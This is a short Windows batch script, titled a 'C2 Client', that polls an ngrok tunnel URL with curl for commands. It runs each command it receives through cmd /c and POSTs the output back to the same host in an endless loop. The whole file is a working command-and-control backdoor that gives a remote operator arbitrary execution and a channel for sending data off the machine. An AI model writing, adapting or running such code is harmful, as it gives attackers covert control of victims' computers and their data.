@echo off
set URL=https://noneconomical-trisha-waitingly.ngrok-free.dev

echo [*] Starting C2 Client
echo [*] URL: %URL%

:loop
    ping -n 2 127.0.0.1 >nul
    
    rem Get command from server
    for /f "usebackq delims=" %%A in (`curl -s %URL% 2^>nul`) do set CMD=%%A
    
    if "%CMD%"=="" goto loop
    
    echo [*] Executing: %CMD%
    
    rem Execute command and send output
    set TEMPFILE=%TEMP%\c2_output.txt
    cmd /c "%CMD%" > "%TEMPFILE%" 2>&1
    
    rem Send output back
    if exist "%TEMPFILE%" (
        for /f "usebackq delims=" %%O in ("%TEMPFILE%") do (
            curl -X POST -d "%%O" %URL% 2>nul
        )
        del "%TEMPFILE%" 2>nul
    )
    
    rem IMPORTANT: Wait for server to process before requesting next command
    timeout /t 1 /nobreak >nul
    
    goto loop
